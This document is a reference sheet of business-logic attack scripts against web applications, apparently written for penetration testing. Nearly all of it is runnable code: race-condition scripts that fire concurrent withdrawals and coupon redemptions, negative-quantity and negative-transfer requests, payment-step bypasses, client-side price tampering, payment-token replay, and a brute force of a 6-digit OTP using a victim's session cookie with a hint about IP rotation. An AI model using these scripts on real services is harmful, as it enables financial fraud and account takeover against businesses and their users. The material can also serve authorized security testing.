# Business Logic Attack Sequences

## Race Condition: Concurrent HTTP Requests

### Python threading — simultaneous balance deduction
```python
import threading
import requests

BASE_URL = "https://target.com"
SESSION_COOKIE = "session=YOUR_AUTH_COOKIE"

def withdraw(amount, results, index):
    r = requests.post(
        f"{BASE_URL}/api/withdraw",
        json={"amount": amount},
        headers={"Cookie": SESSION_COOKIE},
        timeout=10
    )
    results[index] = r.json()
    print(f"Thread {index}: {r.status_code} — {r.json()}")

# Fire 20 simultaneous withdrawal requests
amount = 100   # account balance is 100
n_threads = 20
results = [None] * n_threads
threads = [threading.Thread(target=withdraw, args=(amount, results, i))
           for i in range(n_threads)]

# Synchronize start — all threads begin at the same time
import time
start = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
end = time.time()

print(f"\nCompleted {n_threads} requests in {end-start:.2f}s")
success = sum(1 for r in results if r and r.get('status') == 'ok')
print(f"Successful withdrawals: {success}")
print(f"Expected: 1, Got: {success} → {success - 1} extra free withdrawals!")
```

### Python asyncio — even faster concurrent requests
```python
import asyncio
import aiohttp

async def withdraw(session, url, cookie, amount):
    async with session.post(url, json={"amount": amount},
                            headers={"Cookie": cookie}) as r:
        data = await r.json()
        return r.status, data

async def race_condition_test():
    url = "https://target.com/api/withdraw"
    cookie = "session=YOUR_AUTH_COOKIE"
    amount = 100

    async with aiohttp.ClientSession() as session:
        tasks = [withdraw(session, url, cookie, amount) for _ in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    ok_count = sum(1 for status, data in results
                   if isinstance(data, dict) and data.get('status') == 'ok')
    print(f"Race result: {ok_count}/50 succeeded (expected: 1)")

asyncio.run(race_condition_test())
```

### Burp Suite Turbo Intruder — race condition
```python
# Paste into Turbo Intruder extension (Extensions → Installed → Turbo Intruder)
# Send the target request to Turbo Intruder first

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)

    # Queue 50 identical requests to fire simultaneously
    for i in range(50):
        engine.queue(target.req, gate='race1')

    # Fire all requests at the same time
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    # Mark responses with non-error status as interesting
    if req.status != 400:
        table.add(req)
```

---

## Negative Quantity

### Direct API call with negative value
```bash
# Add -1 of a $100 product → cart total should become -$100
curl -X POST https://target.com/api/cart \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_COOKIE" \
  -d '{"product_id": 42, "quantity": -1}'

# Then checkout — observe total amount charged
curl -X POST https://target.com/api/checkout \
  -H "Cookie: session=YOUR_COOKIE" \
  -d '{}'
# Expected vulnerable behavior: negative total or credit to account
```

### Python PoC — automate negative quantity test
```python
import requests

s = requests.Session()
s.cookies.set('session', 'YOUR_COOKIE')

# Clear cart
s.delete('https://target.com/api/cart')

# Add -5 units of product 1 ($20 each → -$100)
r = s.post('https://target.com/api/cart',
    json={"product_id": 1, "quantity": -5})
print(f"Add to cart: {r.status_code} {r.json()}")

# Add 1 unit of a real purchase to make total positive (optional)
s.post('https://target.com/api/cart',
    json={"product_id": 2, "quantity": 1})   # $10 item

# Checkout — net total should be -$90 (or $0 if floored)
r = s.post('https://target.com/api/checkout')
print(f"Checkout: {r.json()}")
```

### Transfer with negative amount
```bash
# Transfer -1000 from user B to self → gain 1000
curl -X POST https://target.com/api/transfer \
  -H "Content-Type: application/json" \
  -H "Cookie: session=ATTACKER_COOKIE" \
  -d '{"to_user_id": 999, "amount": -1000}'
# If vulnerable: attacker balance +1000, victim balance -1000
```

---

## Workflow Bypass — Skip Payment Step

### Map the API workflow first
```bash
# Step 1: Create order
ORDER=$(curl -s -X POST https://target.com/api/orders \
  -H "Cookie: session=COOKIE" \
  -d '{"items": [{"product_id": 1, "qty": 1}]}' | jq -r '.order_id')
echo "Order ID: $ORDER"

# Step 2: SKIP payment, go directly to fulfillment
curl -X POST "https://target.com/api/orders/$ORDER/fulfill" \
  -H "Cookie: session=COOKIE"
# If 200 OK → workflow bypass confirmed

# Step 3: Or skip to "paid" status directly
curl -X PATCH "https://target.com/api/orders/$ORDER" \
  -H "Cookie: session=COOKIE" \
  -d '{"status": "paid"}'
```

### Python — automated workflow bypass test
```python
import requests

s = requests.Session()
s.cookies.set('session', 'ATTACKER_COOKIE')

# Create order
r = s.post('https://target.com/api/orders',
    json={'items': [{'product_id': 1, 'quantity': 1}]})
order_id = r.json()['order_id']
print(f"Created order {order_id}, status: {r.json()['status']}")

# Skip payment, attempt to fulfill directly
r = s.post(f'https://target.com/api/orders/{order_id}/fulfill')
print(f"Direct fulfill: {r.status_code} — {r.json()}")

if r.status_code == 200:
    print("[VULNERABLE] Workflow bypass confirmed — order fulfilled without payment!")
else:
    print(f"[BLOCKED] {r.json().get('error', 'unknown error')}")
```

---

## Coupon Abuse — Concurrent Redemption Race

```python
import threading
import requests

BASE_URL = "https://target.com"
COUPON_CODE = "SAVE50"
N = 30   # concurrent redemption attempts

def redeem(session_cookie, results, idx):
    r = requests.post(f"{BASE_URL}/api/coupons/redeem",
        json={"code": COUPON_CODE},
        headers={"Cookie": f"session={session_cookie}"},
        timeout=5)
    results[idx] = {'status': r.status_code, 'body': r.json()}

results = [None] * N
threads = [threading.Thread(target=redeem, args=("YOUR_COOKIE", results, i))
           for i in range(N)]

for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [r for r in results if r['status'] == 200]
print(f"Coupon redeemed {len(successes)} times (expected: 1)")
# Each success = one free discount applied
```

---

## Price Manipulation — Intercept and Modify

### Burp Suite — intercept checkout POST
```
# In Burp, intercept POST /checkout:
# Original request body:
{
    "items": [{"product_id": 1, "quantity": 1, "price": 99.99}],
    "total": 99.99
}

# Modified request body:
{
    "items": [{"product_id": 1, "quantity": 1, "price": 0.01}],
    "total": 0.01
}

# If server uses client price: charged $0.01 instead of $99.99
```

### curl — direct price manipulation
```bash
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=COOKIE" \
  -d '{
    "items": [{"product_id": 1, "quantity": 1, "price": 0.01}],
    "total": 0.01,
    "currency": "USD"
  }'
```

---

## Replay Attack — Reusing Payment Tokens

```python
import requests

s = requests.Session()
s.cookies.set('session', 'ATTACKER_COOKIE')

# Step 1: Initiate legitimate payment and capture the payment token
r = s.post('https://target.com/api/orders/1/pay',
    json={'payment_token': 'tok_visa_test'})
payment_ref = r.json().get('payment_reference')
print(f"First payment: {r.status_code} — ref: {payment_ref}")

# Step 2: Replay the SAME payment reference for a different order
r = s.post('https://target.com/api/orders/2/pay',
    json={'payment_reference': payment_ref})
print(f"Replay payment for order 2: {r.status_code} — {r.json()}")

# Step 3: Or replay the original request entirely
r = s.post('https://target.com/api/orders/3/pay',
    json={'payment_token': 'tok_visa_test'})
print(f"Replay original token for order 3: {r.status_code} — {r.json()}")
```

---

## Missing Rate Limit — OTP Brute Force

```python
import requests
import itertools

BASE_URL = "https://target.com"
SESSION_COOKIE = "session=VICTIM_SESSION_AFTER_PASSWORD_LOGIN"

def brute_force_otp():
    # 6-digit OTP: 000000 to 999999
    for otp in itertools.product('0123456789', repeat=6):
        code = ''.join(otp)
        r = requests.post(f"{BASE_URL}/api/verify-otp",
            json={"otp": code},
            headers={"Cookie": SESSION_COOKIE},
            timeout=5)

        if r.status_code == 200:
            print(f"[SUCCESS] OTP found: {code}")
            return code

        if r.status_code == 429:
            print(f"[RATE LIMITED] at OTP {code}")
            return None

        if int(code) % 1000 == 0:
            print(f"Progress: {code}/999999")

    return None

# For a real brute force with rate limiting: add threading + IP rotation
# But the point is: if no rate limit, all 10^6 codes can be tried in minutes
```

### Faster: try most likely OTPs first (TOTP time-based)
```python
import time
import requests

# TOTP codes change every 30s — during the window, only test ~6 values:
# current_code ± 1 step (app may have ±1 drift tolerance)
# Focus timing: send 3-6 guesses right as the 30s window resets

def time_window_attack():
    candidates = ["000000", "123456", "654321", "111111", "999999", "246810"]
    for code in candidates:
        r = requests.post("https://target.com/api/verify-otp",
            json={"otp": code},
            headers={"Cookie": "session=VICTIM_COOKIE"})
        print(f"OTP {code}: {r.status_code}")
        if r.status_code == 200:
            print(f"[FOUND] {code}")
            break
```

---

## Idempotency Key Abuse

```bash
# If the API uses an Idempotency-Key header to deduplicate:
# Test 1: reuse the same idempotency key with different amounts
curl -X POST https://target.com/api/payments \
  -H "Content-Type: application/json" \
  -H "Idempotency-Key: fixed-key-12345" \
  -H "Cookie: session=COOKIE" \
  -d '{"amount": 100}'

# Test 2: reuse same key for different user (is key scoped to user?)
curl -X POST https://target.com/api/payments \
  -H "Content-Type: application/json" \
  -H "Idempotency-Key: fixed-key-12345" \
  -H "Cookie: session=OTHER_USER_COOKIE" \
  -d '{"amount": 1}'
# If not scoped per user: attacker reuses victim's idempotency key → $1 payment
```
